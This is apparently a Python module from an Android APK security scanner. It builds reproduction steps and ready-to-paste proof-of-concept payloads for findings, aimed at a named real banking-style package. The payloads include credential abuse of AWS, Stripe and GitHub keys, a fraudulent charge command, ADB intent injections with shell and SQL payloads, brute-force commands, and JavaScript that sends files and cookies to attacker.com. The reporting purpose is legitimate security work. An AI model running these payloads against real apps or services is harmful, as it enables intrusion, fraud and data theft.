"""
ReproductionEngine v1.0
------------------------
Maps every finding type to:
  - Threat description
  - Exploitation steps (numbered)
  - PoC command/payload (ready to paste)
  - Impact
  - CVSS vector hint
  - References

Called by ReportGenerator to enrich HTML/Markdown reports.
"""
import base64
import json
import re


# ── Helpers ──────────────────────────────────────────────────────────────────

def _b64pad(s):
    pad = 4 - len(s) % 4
    return s + ("=" * (pad % 4))

def _decode_jwt_part(part):
    try:
        decoded = base64.b64decode(_b64pad(part)).decode("utf-8", errors="replace")
        return json.loads(decoded)
    except Exception:
        return None


# ── PoC Templates ─────────────────────────────────────────────────────────────

def poc_for_secret(finding: dict) -> dict:
    stype = finding.get("type", "")
    value = finding.get("value", "")
    locs  = finding.get("locations", [])
    loc_str = locs[0] if locs else "unknown method"

    base = {
        "threat":    f"Hardcoded {stype} found in APK binary",
        "impact":    "Any user who decompiles the APK (e.g., with apktool/jadx) can extract this credential and use it to authenticate with backend services.",
        "steps":     [],
        "poc":       "",
        "cvss":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "reference": "https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage",
    }

    if "Google API Key" in stype:
        base["steps"] = [
            "Decompile APK: `apktool d target.apk -o out/`",
            f"Search for the key: `grep -r 'AIza' out/`",
            f"Key found: `{value}`",
            "Test which APIs are enabled for this key:",
        ]
        base["poc"] = (
            f"# Test Google Maps API (replace KEY)\n"
            f"curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key={value}'\n\n"
            f"# Test Firebase Realtime DB\n"
            f"curl 'https://<project>.firebaseio.com/.json?auth={value}'"
        )
        base["impact"] = "Attacker can use the Google API key to make authenticated API calls, potentially causing billing fraud or data access."

    elif "AWS" in stype and "Access Key ID" in stype:
        base["steps"] = [
            "Extract the key from APK strings",
            "Configure AWS CLI with extracted credentials:",
            "Enumerate accessible resources",
        ]
        base["poc"] = (
            f"aws configure set aws_access_key_id {value}\n"
            f"aws configure set aws_secret_access_key <extract_from_apk>\n"
            f"aws sts get-caller-identity\n"
            f"aws s3 ls\n"
            f"aws iam list-users"
        )
        base["impact"] = "Full AWS account compromise — read S3 buckets, access RDS, exfiltrate data, deploy backdoors."
        base["cvss"]   = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"

    elif "JWT" in stype or "Bearer" in stype:
        base["steps"] = [
            "Extract JWT token from APK string pool",
            f"Decode at https://jwt.io → paste the token",
            "Inspect claims — check for admin roles, user IDs, expiry",
            "Use token directly in API requests",
        ]
        base["poc"] = (
            f"# Use hardcoded token in API request\n"
            f"curl -H 'Authorization: Bearer {value}' \\\n"
            f"     https://<api-host>/api/v1/admin/users\n\n"
            f"# Decode JWT payload (no secret needed for HS256)\n"
            f"echo '{value.split('.')[1] if '.' in value else value}' | base64 -d 2>/dev/null | python3 -m json.tool"
        )
        base["impact"] = "Attacker can impersonate any user whose token is hardcoded, bypassing authentication entirely."

    elif "Firebase" in stype:
        base["steps"] = [
            f"Extract Firebase URL: `{value}`",
            "Test unauthenticated read access:",
            "Test unauthenticated write access:",
        ]
        base["poc"] = (
            f"# Read database without auth\n"
            f"curl '{value}/.json'\n\n"
            f"# Write arbitrary data\n"
            f"curl -X PUT '{value}/pwned.json' -d '{{\"hacked\":true}}'"
        )
        base["impact"] = "If Firebase rules allow unauthenticated access, entire database can be read or overwritten."

    elif "Stripe" in stype:
        base["steps"] = [
            "Extract Stripe secret key from APK",
            "Use key to access Stripe API",
        ]
        base["poc"] = (
            f"# List customers\n"
            f"curl https://api.stripe.com/v1/customers \\\n"
            f"     -u '{value}:'\n\n"
            f"# Create a charge (actual fraud)\n"
            f"curl https://api.stripe.com/v1/charges \\\n"
            f"     -u '{value}:' \\\n"
            f"     -d amount=9999 -d currency=usd -d source=tok_visa"
        )
        base["impact"] = "Full Stripe account takeover: charge cards, list customers, issue refunds, access financial data."
        base["cvss"]   = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"

    elif "PEM" in stype or "Private Key" in stype:
        base["steps"] = [
            "Decompile APK, find private key material in strings",
            "Save key to file and determine algorithm",
            "Use key to decrypt TLS traffic or forge signatures",
        ]
        base["poc"] = (
            f"# Extract private key block from APK smali/strings\n"
            f"# Save to private.key, then:\n"
            f"openssl pkey -in private.key -text -noout\n\n"
            f"# If server cert matches: MITM all TLS with:\n"
            f"mitmproxy --certs *=private.key"
        )
        base["impact"] = "Attacker can decrypt past/future TLS sessions, forge authentication tokens, or impersonate the server."
        base["cvss"]   = "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"

    elif "GitHub" in stype:
        base["steps"] = [
            "Extract token from APK binary strings",
            "Use token to access GitHub API",
        ]
        base["poc"] = (
            f"curl -H 'Authorization: Bearer {value}' \\\n"
            f"     https://api.github.com/user\n\n"
            f"# List repos and look for secrets\n"
            f"curl -H 'Authorization: Bearer {value}' \\\n"
            f"     https://api.github.com/user/repos?visibility=private"
        )
        base["impact"] = "Access to all private repositories, CI/CD secrets, and ability to push malicious code."

    elif "Generic Secret" in stype or "Slack" in stype or "Mailgun" in stype or "SendGrid" in stype:
        base["steps"] = [
            f"Secret found in APK string pool",
            f"Referenced from: `{loc_str}`",
            "Identify the target service from context",
            "Test with appropriate API client",
        ]
        base["poc"] = (
            f"# Generic test — replace with correct endpoint\n"
            f"curl -H 'Authorization: Bearer {value}' \\\n"
            f"     https://api.<target-service>.com/v1/info"
        )

    else:
        base["steps"] = [
            f"Secret type `{stype}` found in string pool",
            f"Location: `{loc_str}`",
            "Extract value and test against known API endpoints",
        ]
        base["poc"] = f"# Value found:\n# {value}"

    return base


def poc_for_jwt(finding: dict) -> dict:
    token   = finding.get("token", "")
    header  = finding.get("header", {}) or {}
    payload = finding.get("payload", {}) or {}

    alg     = header.get("alg", "unknown")
    claims  = json.dumps(payload, indent=2, default=str) if payload else "(could not decode)"
    parts   = token.split(".")
    preview = token[:80] + "..." if len(token) > 80 else token

    weak_alg = alg.lower() in ("hs256", "hs384", "hs512", "none")

    steps = [
        f"Token found in APK string pool (algorithm: {alg})",
        "Decode payload (no secret required):",
        f"```\npython3 -c \"import base64,json; print(json.dumps(json.loads(base64.b64decode('{parts[1] if len(parts)>1 else ''}' + '==').decode()), indent=2))\"\n```",
        "Use token directly in Authorization header against API endpoints",
    ]

    if weak_alg:
        steps.append(f"⚠️ Algorithm is {alg} — attempt brute-force of signing secret with hashcat or jwt_tool")

    poc = (
        f"# Step 1: Decode the token (no secret needed)\n"
        f"python3 -c \"\nimport base64, json\npayload = '{parts[1] if len(parts)>1 else ''}'\npadded  = payload + '=' * (4 - len(payload) % 4)\nprint(json.dumps(json.loads(base64.b64decode(padded)), indent=2))\n\"\n\n"
        f"# Step 2: Use the token in API calls\n"
        f"curl -H 'Authorization: Bearer {preview}' \\\n"
        f"     https://<api-host>/api/v1/profile\n"
    )

    if weak_alg:
        poc += (
            f"\n# Step 3: Brute-force HS256 signing secret\n"
            f"pip install jwt-tool\n"
            f"python3 jwt_tool.py '{token[:120]}...' -C -d /usr/share/wordlists/rockyou.txt"
        )

    return {
        "threat":    f"Hardcoded JWT token (alg={alg}) found in APK",
        "impact":    "Attacker can replay this token to authenticate as the associated user. If HS256, the signing secret can be brute-forced offline.",
        "claims":    claims,
        "algorithm": alg,
        "weak_alg":  weak_alg,
        "steps":     steps,
        "poc":       poc,
        "cvss":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "reference": "https://portswigger.net/web-security/jwt",
    }


def poc_for_exported_component(comp: dict) -> dict:
    name  = comp.get("name", "")
    ctype = comp.get("type", "activity")

    if ctype == "activity":
        poc = (
            f"# Launch the exported activity directly (no auth required)\n"
            f"adb shell am start -n com.manappuram.palma/{name}\n\n"
            f"# With intent extras (try common bypass params)\n"
            f"adb shell am start -n com.manappuram.palma/{name} \\\n"
            f"    --ez isAdmin true \\\n"
            f"    --es userId 1337"
        )
        threat = f"Exported Activity reachable without authentication"
        impact = "Any app on the device (or via ADB) can directly launch this activity, bypassing authentication or authorization gates."

    elif ctype == "service":
        poc = (
            f"# Start the exported service\n"
            f"adb shell am startservice -n com.manappuram.palma/{name}\n\n"
            f"# Bind and interact (requires ADB or malicious app):\n"
            f"adb shell am startservice -n com.manappuram.palma/{name} \\\n"
            f"    --es command 'dump_data'"
        )
        threat = "Exported Service reachable by any app"
        impact = "Attacker app can start or bind to this service, triggering privileged operations or extracting data."

    elif ctype == "receiver":
        poc = (
            f"# Send a broadcast to the exported receiver\n"
            f"adb shell am broadcast -a android.intent.action.BOOT_COMPLETED \\\n"
            f"    -n com.manappuram.palma/{name}\n\n"
            f"# Custom action broadcast\n"
            f"adb shell am broadcast \\\n"
            f"    -n com.manappuram.palma/{name} \\\n"
            f"    --es data 'injected_payload'"
        )
        threat = "Exported BroadcastReceiver accepts unsolicited broadcasts"
        impact = "Malicious apps can trigger this receiver at will, potentially causing privilege escalation or data leakage."

    elif ctype == "provider":
        poc = (
            f"# Query the exported ContentProvider directly\n"
            f"adb shell content query --uri content://com.manappuram.palma.provider/\n\n"
            f"# Try common paths for sensitive data\n"
            f"adb shell content query --uri content://com.manappuram.palma.provider/users\n"
            f"adb shell content query --uri content://com.manappuram.palma.provider/accounts"
        )
        threat = "Exported ContentProvider accessible without permission"
        impact = "Any app can query the provider's data, potentially exposing the entire database."
    else:
        poc    = f"adb shell am start -n com.manappuram.palma/{name}"
        threat = f"Exported {ctype} with no access control"
        impact = "Accessible by any app on the device."

    return {
        "threat":     threat,
        "impact":     impact,
        "component":  name,
        "type":       ctype,
        "steps": [
            f"Identify exported {ctype}: `{name}`",
            "No android:permission or android:exported=false protection",
            "Trigger via ADB or malicious app:",
        ],
        "poc":       poc,
        "cvss":      "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:M/A:L",
        "reference": "https://developer.android.com/guide/topics/manifest/activity-element#exported",
    }


def poc_for_webview(finding: dict) -> dict:
    vuln   = finding.get("vulnerability", "")
    cls    = finding.get("class", "")
    risk   = finding.get("risk", "High")

    if "addJavascriptInterface" in vuln:
        poc = (
            "# If app loads attacker-controlled URL in this WebView:\n"
            "# Host a page that calls the exposed Java bridge:\n\n"
            "<html><body><script>\n"
            "  // Call any exposed Java method\n"
            "  var bridge = window.injectedObject;\n"
            "  bridge.dangerousMethod();\n\n"
            "  // Or RCE via Runtime.exec (if bridge exposes it):\n"
            "  var r = bridge.getClass().forName('java.lang.Runtime')\n"
            "           .getMethod('exec', String.class)\n"
            "           .invoke(bridge.getClass().forName('java.lang.Runtime')\n"
            "           .getMethod('getRuntime').invoke(null), 'id');\n"
            "</script></body></html>"
        )
        threat = "WebView addJavascriptInterface → Remote Code Execution"
        impact = "If the WebView loads attacker-controlled content, the JavaScript bridge can be abused to execute arbitrary Java code on the device."
        cvss   = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"

    elif "FileAccess" in vuln or "UniversalAccess" in vuln:
        poc = (
            "# Trick the WebView into loading a file:// URL:\n"
            "# 1. Share a deep link or intent that loads this URL:\n"
            "adb shell am start -n com.manappuram.palma/.MainActivity \\\n"
            "    --es url 'file:///data/data/com.manappuram.palma/shared_prefs/user.xml'\n\n"
            "# 2. Or serve an HTML page that does:\n"
            "<script>\n"
            "  var xhr = new XMLHttpRequest();\n"
            "  xhr.open('GET', 'file:///data/data/com.manappuram.palma/shared_prefs/user.xml');\n"
            "  xhr.send();\n"
            "  xhr.onload = () => fetch('https://attacker.com/?leak=' + btoa(xhr.responseText));\n"
            "</script>"
        )
        threat = "WebView File Access → Local File Exfiltration"
        impact = "Attacker can read any file in the app's private data directory (SharedPreferences, SQLite databases, tokens) via a crafted URL loaded in the WebView."
        cvss   = "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"

    elif "JavaScript" in vuln:
        poc = (
            "# XSS via WebView — inject into any loaded URL parameter:\n"
            "adb shell am start -n com.manappuram.palma/.WebActivity \\\n"
            "    --es url 'https://example.com?q=<script>alert(document.cookie)</script>'\n\n"
            "# Or DOM-based XSS if URL is reflected:\n"
            "https://app-api.com/page?name=<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"
        )
        threat = "JavaScript Enabled in WebView → XSS"
        impact = "JavaScript is enabled in this WebView. If any user-controlled input is reflected (XSS), it runs with the app's origin, accessing localStorage and cookies."
        cvss   = "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:M/I:M/A:N"

    else:
        poc    = f"# Review class {cls} for WebView misconfigurations\n# Manual analysis required"
        threat = f"Insecure WebView configuration: {vuln}"
        impact = "WebView misconfiguration may allow XSS, local file access, or JavaScript bridge abuse."
        cvss   = "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:M/I:M/A:N"

    return {
        "threat":    threat,
        "impact":    impact,
        "class":     cls,
        "vuln":      vuln,
        "steps": [
            f"Identified in class: `{cls}`",
            f"Misconfiguration: `{vuln}`",
            "Craft a URL that triggers the vulnerable code path",
            "Deliver via deep link, push notification, or QR code",
        ],
        "poc":       poc,
        "cvss":      cvss,
        "reference": "https://labs.withsecure.com/publications/webview-addjavascriptinterface-remote-code-execution",
    }


def poc_for_endpoint(endpoint: dict) -> dict:
    url   = endpoint.get("url", "")
    cats  = endpoint.get("categories", [])
    risk  = endpoint.get("risk", "Medium")

    steps = [
        f"Endpoint discovered: `{url}`",
        "Test with unauthenticated request",
        "Enumerate with common paths/parameters",
    ]

    poc = f"# Basic endpoint probe\ncurl -v '{url}'\n\n"

    if "admin" in cats:
        poc += (
            f"# Admin path — test for IDOR and auth bypass:\n"
            f"curl -v '{url}' -H 'X-Forwarded-For: 127.0.0.1'\n"
            f"curl -v '{url}' -H 'Authorization: Bearer <extracted_token>'\n\n"
            f"# IDOR test:\n"
            f"for id in 1 2 3 100 1000; do curl -s '{url}/'$id; done"
        )
        threat = f"Admin API endpoint exposed in APK binary"
        impact = "Admin endpoints with no authentication leak internal data or allow privileged operations."
    elif "auth" in cats:
        poc += (
            f"# Auth endpoint — test for SQL injection, rate limiting:\n"
            f"curl -X POST '{url}' \\\n"
            f"     -H 'Content-Type: application/json' \\\n"
            f"     -d '{{\"username\":\"admin\\' OR 1=1--\",\"password\":\"x\"}}'\n\n"
            f"# Brute-force with hydra (no rate limit):\n"
            f"hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n"
            f"      -s 443 -S api.target.com http-post-form '{url}:username=^USER^&password=^PASS^:Invalid'"
        )
        threat = "Authentication endpoint found — test for weak controls"
        impact = "Auth endpoints may be vulnerable to brute force, SQL injection, or account enumeration."
    else:
        threat = f"API endpoint discovered in APK binary"
        impact = "Endpoints discovered via static analysis can be probed for IDOR, injection, or information disclosure."

    return {
        "threat":  threat,
        "impact":  impact,
        "url":     url,
        "categories": cats,
        "steps":   steps,
        "poc":     poc,
        "cvss":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:M/I:L/A:N",
        "reference": "https://owasp.org/www-project-api-security/",
    }


def poc_for_icc(finding: dict) -> dict:
    comp  = finding.get("component", "")
    entry = finding.get("entry_point", "")
    sink  = finding.get("sink", "")
    risk  = finding.get("risk", "High")

    if "exec" in sink or "ProcessBuilder" in sink:
        poc = (
            f"# Send a crafted Intent to trigger the vulnerable component:\n"
            f"adb shell am broadcast -n com.manappuram.palma/{comp} \\\n"
            f"    --es cmd 'id; cat /data/data/com.manappuram.palma/databases/app.db'\n\n"
            f"# Or send via a malicious app:\n"
            f"Intent i = new Intent();\n"
            f"i.setComponent(new ComponentName(\"com.manappuram.palma\", \"{comp}\"));\n"
            f"i.putExtra(\"cmd\", \"id\");\n"
            f"context.startActivity(i);"
        )
        threat = "Intent data flows to Runtime.exec() → Remote Code Execution"
        impact = "An attacker can send a crafted Intent containing shell commands that get executed by the app on the device."
        cvss   = "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"

    elif "execSQL" in sink or "rawQuery" in sink:
        poc = (
            f"# SQL injection via Intent extra:\n"
            f"adb shell am broadcast -n com.manappuram.palma/{comp} \\\n"
            f"    --es query \"' OR 1=1 --\"\n\n"
            f"# Extract all data:\n"
            f"adb shell am start -n com.manappuram.palma/{comp} \\\n"
            f"    --es id \"1 UNION SELECT username,password,3 FROM users--\""
        )
        threat = "Intent data flows to SQLiteDatabase.execSQL() → SQL Injection"
        impact = "Attacker can inject SQL via Intent extras, dumping the entire local database."
        cvss   = "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"

    elif "loadUrl" in sink or "evaluateJavascript" in sink:
        poc = (
            f"# Inject JavaScript via Intent into WebView:\n"
            f"adb shell am start -n com.manappuram.palma/{comp} \\\n"
            f"    --es url 'javascript:fetch(\"https://attacker.com?c=\"+document.cookie)'\n\n"
            f"# Or load attacker page:\n"
            f"adb shell am start -n com.manappuram.palma/{comp} \\\n"
            f"    --es url 'https://attacker.com/evil.html'"
        )
        threat = "Intent data flows to WebView.loadUrl() → XSS/RCE"
        impact = "Attacker can load arbitrary URLs or JavaScript into the WebView, stealing tokens or executing code."
        cvss   = "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"

    else:
        poc    = f"adb shell am start -n com.manappuram.palma/{comp} --es data 'malicious_input'"
        threat = f"Intent data reaches dangerous sink: {sink}"
        impact = "Tainted data from an external Intent reaches a sensitive operation."
        cvss   = "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:M/I:M/A:N"

    return {
        "threat":      threat,
        "impact":      impact,
        "component":   comp,
        "entry_point": entry,
        "sink":        sink,
        "steps": [
            f"Entry point: `{entry}` in `{comp}`",
            f"Data flows to dangerous sink: `{sink}`",
            "Craft a malicious Intent with injected payload",
            "Send via ADB or a malicious companion app",
        ],
        "poc":       poc,
        "cvss":      cvss,
        "reference": "https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage",
    }


def poc_for_data_storage(finding: dict) -> dict:
    stype    = finding.get("type", "")
    location = finding.get("location", "")
    note     = finding.get("note", "")

    if "External" in stype:
        poc = (
            "# Any app with READ_EXTERNAL_STORAGE can access these files:\n"
            "adb shell ls -la /sdcard/\n"
            "adb pull /sdcard/ ./leaked_data/\n\n"
            "# On a rooted device or via a companion app:\n"
            "adb shell find /sdcard/ -name '*.db' -o -name '*.json' -o -name '*.xml'"
        )
    elif "SQLite" in stype:
        poc = (
            "# On rooted device — pull and open the unencrypted database:\n"
            "adb root\n"
            "adb pull /data/data/com.manappuram.palma/databases/ ./dbs/\n"
            "sqlite3 dbs/app_db.db '.tables'\n"
            "sqlite3 dbs/app_db.db 'SELECT * FROM users;'\n\n"
            "# Via ADB backup (no root needed on some devices):\n"
            "adb backup -noapk com.manappuram.palma\n"
            "java -jar abe.jar unpack backup.ab backup.tar\n"
            "tar xvf backup.tar"
        )
    elif "SharedPreferences" in stype:
        poc = (
            "# On rooted device — read SharedPreferences XML:\n"
            "adb root\n"
            "adb shell cat /data/data/com.manappuram.palma/shared_prefs/*.xml\n\n"
            "# Via ADB backup:\n"
            "adb backup -noapk com.manappuram.palma\n"
            "# Extract and read shared_prefs/*.xml for tokens/passwords"
        )
    else:
        poc = f"# Manual inspection required\n# Location: {location}"

    return {
        "threat":  f"Insecure Data Storage: {stype}",
        "impact":  note or "Sensitive data is stored without encryption and accessible to other apps, backups, or physical device access.",
        "location": location,
        "steps": [
            f"Data storage issue found: `{stype}`",
            f"Code location: `{location}`",
            "Access via ADB backup, rooted device, or companion app",
        ],
        "poc":       poc,
        "cvss":      "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "reference": "https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05d-testing-data-storage",
    }


# ── Public API ────────────────────────────────────────────────────────────────

def enrich_findings(all_findings: dict, package: str = "") -> dict:
    """
    Takes raw findings dict and returns an enriched dict where each finding
    has a `reproduction` key containing threat/steps/poc/impact/cvss.
    """
    enriched = {}

    # Secret
    enriched["Secret"] = []
    
    # 1. Dalvik secrets
    for sec in (all_findings.get("Secret") or []):
        item = dict(sec)
        item["reproduction"] = poc_for_secret(sec)
        enriched["Secret"].append(item)
        
    # 2. Native library secrets
    native_data = all_findings.get("NativeLibrary") or {}
    for nat_sec in native_data.get("secrets_found", []):
        item = dict(nat_sec)
        # Map native library name to locations list so poc_for_secret handles it correctly
        item["locations"] = [f"Native library: {item.get('library')}"]
        item["reproduction"] = poc_for_secret(item)
        enriched["Secret"].append(item)

    # 3. CrossPlatform secrets
    cp_data = all_findings.get("CrossPlatform") or {}
    for cp_sec in cp_data.get("secrets_found", []):
        item = dict(cp_sec)
        item["locations"] = [f"JS Bundle: {item.get('bundle')}"]
        item["reproduction"] = poc_for_secret(item)
        enriched["Secret"].append(item)

    # JWT
    enriched["JWT"] = []
    for j in (all_findings.get("JWT") or []):
        item = dict(j)
        item["reproduction"] = poc_for_jwt(j)
        enriched["JWT"].append(item)

    # Manifest — exported components
    manifest = dict(all_findings.get("Manifest") or {})
    enriched_components = []
    for comp in manifest.get("exported_components", []):
        item = dict(comp)
        item["reproduction"] = poc_for_exported_component(comp)
        enriched_components.append(item)
    manifest["exported_components"] = enriched_components
    enriched["Manifest"] = manifest

    # WebView
    enriched["WebView"] = []
    for wv in (all_findings.get("WebView") or []):
        item = dict(wv)
        item["reproduction"] = poc_for_webview(wv)
        enriched["WebView"].append(item)

    # Endpoints
    endpoint_data = dict(all_findings.get("Endpoint") or {})
    enriched_urls = []
    for ep in endpoint_data.get("urls", []):
        item = dict(ep)
        item["reproduction"] = poc_for_endpoint(ep)
        enriched_urls.append(item)
        
    # Merge CrossPlatform endpoints
    for cp_ep in cp_data.get("endpoints_found", []):
        # Format it so poc_for_endpoint handles it
        item = {"url": cp_ep, "categories": ["CrossPlatform JS Bundle"]}
        item["reproduction"] = poc_for_endpoint(item)
        enriched_urls.append(item)
        
    endpoint_data["urls"] = enriched_urls
    enriched["Endpoint"] = endpoint_data

    # ICC
    enriched["ICC"] = []
    for icc in (all_findings.get("ICC") or []):
        item = dict(icc)
        item["reproduction"] = poc_for_icc(icc)
        enriched["ICC"].append(item)

    # DataStorage
    enriched["DataStorage"] = []
    for ds in (all_findings.get("DataStorage") or []):
        item = dict(ds)
        item["reproduction"] = poc_for_data_storage(ds)
        enriched["DataStorage"].append(item)

    # Pass-through for all other modules unchanged
    for key in all_findings:
        if key not in enriched:
            enriched[key] = all_findings[key]

    return enriched
